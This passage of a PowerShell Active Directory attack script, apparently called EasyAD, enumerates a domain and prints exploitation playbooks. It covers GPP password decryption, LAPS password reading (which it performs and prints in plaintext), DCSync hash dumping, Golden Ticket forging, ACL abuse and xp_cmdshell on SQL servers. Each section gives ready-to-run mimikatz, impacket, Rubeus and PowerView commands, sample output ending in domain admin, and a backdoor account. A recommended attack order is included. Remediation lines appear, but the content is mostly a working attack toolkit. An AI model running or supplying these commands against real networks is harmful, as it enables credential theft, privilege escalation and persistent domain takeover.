        Microsoft published the key in MSDN documentation
        Any domain user can decrypt these passwords

STEP 2: Extract cpassword value from XML files
        Parse Groups.xml, Services.xml, or other policy files
        Look for cpassword attribute

STEP 3: Decrypt with gpp-decrypt or PowerShell
        Use built-in AES key to decrypt
        Get plaintext password

STEP 4: Use credentials for lateral movement
        Check if password reused on other accounts
        Test on workstations and servers
"@

            $commands = @"
findstr /S /I cpassword \\$script:DomainName\sysvol\$script:DomainName\policies\*.xml

gpp-decrypt "CPASSWORD_VALUE_HERE"

Get-GPPPassword (PowerSploit)
Invoke-GPPPassword
"@

            $example = @"
findstr /S /I cpassword \\corp.com\sysvol\corp.com\policies\*.xml
Groups.xml: cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
Password123!

crackmapexec smb $script:DCIP -u localadmin -p 'Password123!' --local-auth
"@

            Write-Finding -Title "Group Policy Preference Passwords" `
                -Severity "HIGH" `
                -Description "Found $($foundCreds.Count) XML files containing GPP passwords in SYSVOL. These can be decrypted by any domain user." `
                -Impact "• Plaintext credentials stored in GPP`n• Accessible to all domain users`n• Often grants local admin access" `
                -Detection "Files: $($foundCreds -join ', ')" `
                -Exploitation $exploitation `
                -Command $commands `
                -Example $example `
                -Remediation "Remove GPP passwords from SYSVOL, use LAPS instead"
        } else {
            Write-Host "    [✓] No GPP passwords found in SYSVOL" -ForegroundColor Green
        }
    } else {
        Write-Host "    [!] Cannot access SYSVOL share" -ForegroundColor Yellow
    }
}

function Test-LAPSDeployed {
    Write-SectionHeader "LAPS (Local Administrator Password Solution)" "🔑"
    
    $lapsAttr = Invoke-LDAPQuery -Filter "(ms-Mcs-AdmPwd=*)" -Properties @("dNSHostName","ms-Mcs-AdmPwd")
    
    if ($lapsAttr.Count -gt 0) {
        Write-Host "`n[!] LAPS is deployed and you can read passwords for $($lapsAttr.Count) systems!" -ForegroundColor Red
        
        foreach ($computer in $lapsAttr) {
            Write-Host "    → $($computer.Properties.dnshostname[0])" -ForegroundColor Yellow
            Write-Host "      Password: $($computer.Properties.'ms-mcs-admpwd'[0])" -ForegroundColor Green
        }
        
        $commands = @"
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object { $_.'ms-Mcs-AdmPwd' -ne `$null } | Select-Object Name,ms-Mcs-AdmPwd

crackmapexec smb $($lapsAttr[0].Properties.dnshostname[0]) -u Administrator -p 'LAPS_PASSWORD' --local-auth
evil-winrm -i $($lapsAttr[0].Properties.dnshostname[0]) -u Administrator -p 'LAPS_PASSWORD'
"@

        Write-Finding -Title "LAPS Passwords Readable" `
            -Severity "CRITICAL" `
            -Description "You have permission to read LAPS passwords. This grants local administrator access to systems." `
            -Impact "• Local admin on multiple systems`n• Lateral movement capability`n• Potential privilege escalation" `
            -Detection "Accessible systems: $($lapsAttr.Count)" `
            -Command $commands `
            -Remediation "Restrict ms-Mcs-AdmPwd read permissions to specific admin groups"
    } else {
        $lapsSchema = Invoke-LDAPQuery -Filter "(name=ms-Mcs-AdmPwd)" -SearchBase "CN=Schema,$script:ConfigDN" -Properties @("name")
        
        if ($lapsSchema) {
            Write-Host "`n[*] LAPS is installed but you cannot read passwords" -ForegroundColor Yellow
        } else {
            Write-Host "`n[✓] LAPS is not deployed" -ForegroundColor Green
        }
    }
}

function Test-DCSync {
    Write-SectionHeader "DCSYNC PERMISSIONS" "💀"
    
    Write-Host "`n[*] Checking for DCSync rights on domain..." -ForegroundColor Cyan
    
    $exploitation = @"
STEP 1: DCSync mimics Domain Controller replication
        Requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
        Domain Admins have this by default

STEP 2: Check if current user has replication rights
        Query ACLs on domain root for replication permissions
        Service accounts sometimes misconfigured with these rights

STEP 3: Dump all domain hashes remotely
        No code execution on DC required
        Extract NTLM hashes for all users including KRBTGT

STEP 4: Use KRBTGT hash for Golden Ticket
        Create forged TGT valid for 10 years
        Full domain persistence and compromise

STEP 5: Pass-the-Hash for lateral movement
        Use Administrator NTLM hash with impacket
        Access any system in the domain
"@

    $commands = @"
impacket-secretsdump -just-dc $script:DomainName/Administrator:Password@$script:DCIP
impacket-secretsdump -just-dc-user krbtgt $script:DomainName/user:pass@$script:DomainController
impacket-secretsdump -just-dc -hashes :NTLM_HASH $script:DomainName/Administrator@$script:DCIP

mimikatz.exe "lsadump::dcsync /domain:$script:DomainName /all /csv" exit
mimikatz.exe "lsadump::dcsync /domain:$script:DomainName /user:krbtgt" exit
"@

    $example = @"
impacket-secretsdump -just-dc $script:DomainName/Administrator:P@ssw0rd@$script:DCIP
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a7c32e5b1c4d6e9f0a2b3c4d5e6f7a8:::
jsmith:1103:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::

impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@$script:DCIP
C:\Windows\system32>whoami
nt authority\system
"@

    Write-Finding -Title "DCSync Attack - Domain Hash Extraction" `
        -Severity "CRITICAL" `
        -Description "If you have replication rights, you can extract all password hashes from the domain remotely." `
        -Impact "• Extract all domain password hashes`n• Obtain KRBTGT hash for Golden Tickets`n• Complete domain compromise" `
        -Exploitation $exploitation `
        -Command $commands `
        -Example $example `
        -Remediation "Restrict replication permissions to only Domain Controllers"
}

function Test-GoldenTicket {
    Write-SectionHeader "GOLDEN TICKET ATTACK" "🎟️"
    
    $exploitation = @"
STEP 1: Obtain KRBTGT account NTLM hash
        Use DCSync after gaining Domain Admin
        impacket-secretsdump -just-dc-user krbtgt

STEP 2: Get domain SID
        Already obtained during enumeration
        Format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

STEP 3: Forge Golden Ticket with Mimikatz or Impacket
        Create TGT for any user (even non-existent)
        Set arbitrary group memberships (Domain Admins, Enterprise Admins)
        Ticket valid for 10 years by default

STEP 4: Inject ticket into memory
        Mimikatz: /ptt flag injects automatically
        Impacket: Export KRB5CCNAME environment variable

STEP 5: Access any resource in domain
        No password needed
        Persistence survives password resets
        Can create backdoor accounts

STEP 6: Silver Ticket for specific services
        Use service account hash instead of KRBTGT
        More stealthy, harder to detect
        Limited to specific service/host
"@

    $commands = @"
impacket-secretsdump -just-dc-user krbtgt $script:DomainName/Administrator:P@ss@$script:DCIP

mimikatz.exe "kerberos::golden /domain:$script:DomainName /sid:$script:DomainSID /rc4:KRBTGT_NTLM_HASH /user:Administrator /id:500 /groups:512,513,518,519,520 /ptt" exit

mimikatz.exe "kerberos::golden /domain:$script:DomainName /sid:$script:DomainSID /aes256:KRBTGT_AES256_KEY /user:FakeAdmin /id:500 /groups:512 /ptt" exit

impacket-ticketer -nthash KRBTGT_HASH -domain-sid $script:DomainSID -domain $script:DomainName Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass Administrator@$script:DomainController

Rubeus.exe golden /rc4:KRBTGT_HASH /domain:$script:DomainName /sid:$script:DomainSID /user:Administrator /ptt
"@

    $example = @"
impacket-secretsdump -just-dc-user krbtgt $script:DomainName/Administrator:Pass@$script:DCIP
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a7c32e5b1c4d6e9f0a2b3c4d5e6f7a8:::

mimikatz # kerberos::golden /domain:$script:DomainName /sid:$script:DomainSID /rc4:8a7c32e5b1c4d6e9f0a2b3c4d5e6f7a8 /user:Administrator /id:500 /groups:512 /ptt
User      : Administrator
Domain    : $script:DomainName ($($script:DomainName.ToUpper()))
SID       : $script:DomainSID
[*] Golden ticket successfully imported!

C:\>dir \\$script:DomainController\c$
Access granted!

C:\>net user backdoor P@ssw0rd! /add /domain
The command completed successfully.
"@

    Write-Finding -Title "Golden Ticket - Domain Persistence" `
        -Severity "CRITICAL" `
        -Description "After compromising KRBTGT hash, create forged TGTs for complete domain control and long-term persistence." `
        -Impact "• 10-year ticket validity`n• Survives password resets`n• Undetectable without proper monitoring`n• Full domain access" `
        -Exploitation $exploitation `
        -Command $commands `
        -Example $example `
        -Remediation "Reset KRBTGT password twice, monitor for anomalous Kerberos tickets"
}

function Test-ACLAbuse {
    Write-SectionHeader "ACL ABUSE OPPORTUNITIES" "🔓"
    
    Write-Host "`n[*] Checking for exploitable ACL permissions..." -ForegroundColor Cyan
    
    $exploitation = @"
STEP 1: Enumerate ACLs with PowerView or BloodHound
        Look for GenericAll, GenericWrite, WriteDacl, WriteOwner
        Focus on paths to Domain Admins group

STEP 2: GenericAll on user object
        Reset password: net user target NewPass123! /domain
        Add SPN for Kerberoasting
        Targeted AS-REP roasting

STEP 3: GenericAll/GenericWrite on group
        Add yourself to privileged group
        net group "Domain Admins" youruser /add /domain

STEP 4: WriteDacl permission
        Grant yourself GenericAll
        Then exploit as above

STEP 5: ForceChangePassword
        Reset target user password
        Use credentials for lateral movement

STEP 6: AddMember on group
        Add user to privileged groups
        Escalate to Domain Admin
"@

    $commands = @"
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {`$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl"}

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'youruser'

Set-DomainUserPassword -Identity targetuser -Password (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All

Import-Module PowerView.ps1
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {`$_.IdentityReferenceName -match "youruser"}

bloodhound-python -d $script:DomainName -u user -p pass -c all -dc $script:DomainController
"@

    $example = @"
Get-DomainObjectAcl -ResolveGUIDs | ? {`$_.ActiveDirectoryRights -match "GenericAll"}
ObjectDN              : CN=admin user,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : GenericAll
IdentityReferenceName : helpdesk

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'helpdesk'
Successfully added helpdesk to Domain Admins

net user helpdesk
Group Memberships:     *Domain Admins        *Domain Users
"@

    Write-Finding -Title "ACL Abuse - Permission Escalation" `
        -Severity "HIGH" `
        -Description "Misconfigured ACLs allow privilege escalation through password resets, group modifications, or permission changes." `
        -Impact "• Password resets on privileged accounts`n• Adding users to admin groups`n• Modifying object permissions`n• Path to Domain Admin" `
        -Exploitation $exploitation `
        -Command $commands `
        -Example $example `
        -Remediation "Review and restrict ACLs, use AdminSDHolder protection, run BloodHound regularly"
}

function Test-SQLServers {
    Write-SectionHeader "SQL SERVER ENUMERATION" "💾"
    
    $sqlServers = Invoke-LDAPQuery -Filter "(servicePrincipalName=MSSQLSvc*)" -Properties @("servicePrincipalName","dNSHostName","samAccountName")
    
    if ($sqlServers.Count -gt 0) {
        Write-Host "`n[*] Found $($sqlServers.Count) SQL Server instances:" -ForegroundColor Yellow
        
        foreach ($sql in $sqlServers) {
            $spns = $sql.Properties.serviceprincipalname | Where-Object { $_ -like "MSSQLSvc*" }
            foreach ($spn in $spns) {
                Write-Host "    → $spn" -ForegroundColor Cyan
            }
        }
        
        $exploitation = @"
STEP 1: Enumerate SQL Servers via LDAP SPNs
        Look for MSSQLSvc service principals
        Identify instances and ports

STEP 2: Test for trusted authentication
        Try connecting with current domain credentials
        Many SQL servers trust domain users

STEP 3: Check for xp_cmdshell enabled
        If enabled, can execute OS commands
        EXEC xp_cmdshell 'whoami'

STEP 4: Enable xp_cmdshell if disabled
        EXEC sp_configure 'show advanced options', 1
        EXEC sp_configure 'xp_cmdshell', 1
        RECONFIGURE

STEP 5: Execute commands for privilege escalation
        Download and execute reverse shell
        Add domain user to local administrators
        Capture NTLM hashes via xp_dirtree

STEP 6: Check for SQL Server links
        EXEC sp_linkedservers
        Pivot through linked servers
        Potential for further compromise
"@

        $commands = @"
impacket-mssqlclient -windows-auth $script:DomainName/user:password@SQL_SERVER

SELECT SYSTEM_USER;
EXEC xp_cmdshell 'whoami';

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'powershell -enc BASE64_PAYLOAD';

Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10

Invoke-SQLAudit -Instance "SQL01" -Username "$script:DomainName\user" -Password "pass"
"@

        $example = @"
impacket-mssqlclient -windows-auth $script:DomainName/user:pass@sql01.corp.com

SQL> SELECT SYSTEM_USER;
$script:DomainName\user

SQL> EXEC xp_cmdshell 'whoami';
nt service\mssqlserver

SQL> EXEC xp_cmdshell 'net localgroup administrators domain\user /add';
The command completed successfully.
"@

        Write-Finding -Title "SQL Server Discovery" `
            -Severity "MEDIUM" `
            -Description "SQL Servers often trust domain authentication and can provide command execution via xp_cmdshell." `
            -Impact "• Command execution on SQL servers`n• Credential theft via xp_dirtree`n• Lateral movement through SQL links`n• Potential privilege escalation" `
            -Detection "Found $($sqlServers.Count) SQL instances" `
            -Exploitation $exploitation `
            -Command $commands `
            -Example $example `
            -Remediation "Disable xp_cmdshell, use least-privilege SQL accounts, audit SQL permissions"
    } else {
        Write-Host "`n[✓] No SQL Server instances found via LDAP" -ForegroundColor Green
    }
}

function Get-Summary {
    Write-SectionHeader "ATTACK SUMMARY & RECOMMENDATIONS" "📊"
    
    Write-Host "`n[*] Vulnerability Summary:" -ForegroundColor Cyan
    Write-Host "    Domain: $script:DomainName" -ForegroundColor White
    Write-Host "    DC: $script:DomainController ($script:DCIP)" -ForegroundColor White
    Write-Host "    Scan Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor White
    
    Write-Host "`n[*] Recommended Attack Order:" -ForegroundColor Yellow
    Write-Host "    1. AS-REP Roasting (if found) - No credentials needed" -ForegroundColor Green
    Write-Host "    2. Kerberoasting - Any domain user can execute" -ForegroundColor Yellow
    Write-Host "    3. GPP Password extraction - Check SYSVOL" -ForegroundColor Yellow
    Write-Host "    4. LAPS password reading (if accessible)" -ForegroundColor Red
    Write-Host "    5. Unconstrained Delegation - Compromise target servers" -ForegroundColor Red
    Write-Host "    6. ACL abuse - Check with BloodHound" -ForegroundColor Yellow
    Write-Host "    7. SQL Server exploitation" -ForegroundColor Yellow
    Write-Host "    8. After DA: DCSync + Golden Ticket" -ForegroundColor Red
    
    Write-Host "`n[*] Quick Command Reference:" -ForegroundColor Cyan
    Write-Host "    Enumeration:" -ForegroundColor White
    Write-Host "      bloodhound-python -d $script:DomainName -u user -p pass -c all" -ForegroundColor Gray
    Write-Host "      impacket-GetADUsers -all $script:DomainName/user:pass" -ForegroundColor Gray
    
    Write-Host "`n    Initial Access:" -ForegroundColor White
    Write-Host "      impacket-GetNPUsers -dc-ip $script:DCIP -request $script:DomainName/" -ForegroundColor Gray
    Write-Host "      impacket-GetUserSPNs -dc-ip $script:DCIP -request $script:DomainName/user:pass" -ForegroundColor Gray
    
    Write-Host "`n    Post-Exploitation:" -ForegroundColor White
    Write-Host "      impacket-secretsdump -just-dc $script:DomainName/Administrator:pass@$script:DCIP" -ForegroundColor Gray
    Write-Host "      impacket-psexec $script:DomainName/Administrator:pass@$script:DCIP" -ForegroundColor Gray
    
    Write-Host "`n[*] Export findings to BloodHound for attack path analysis" -ForegroundColor Yellow
    Write-Host "    Run: bloodhound-python -d $script:DomainName -u user -p pass -c all -dc $script:DomainController" -ForegroundColor Gray
    
    Write-Host "`n" + ("=" * 100) -ForegroundColor Cyan
    Write-Host " EasyAD Scan Complete - Use findings for penetration testing" -ForegroundColor Green
    Write-Host ("=" * 100) -ForegroundColor Cyan
}

Write-Banner

$connected = Get-DomainInfo

if ($connected) {
    Test-PasswordPolicies
    Test-PrivilegedUsers
    Test-ASREPRoasting
    Test-Kerberoasting
    Test-UnconstrainedDelegation
    Test-ConstrainedDelegation
    Test-RBCD
    Test-GPPPasswords
    Test-LAPSDeployed
    Test-DCSync
    Test-GoldenTicket
    Test-ACLAbuse
    Test-SQLServers
    Get-Summary
} else {
    Write-Host "[!] Cannot connect to domain. Exiting..." -ForegroundColor Red
}
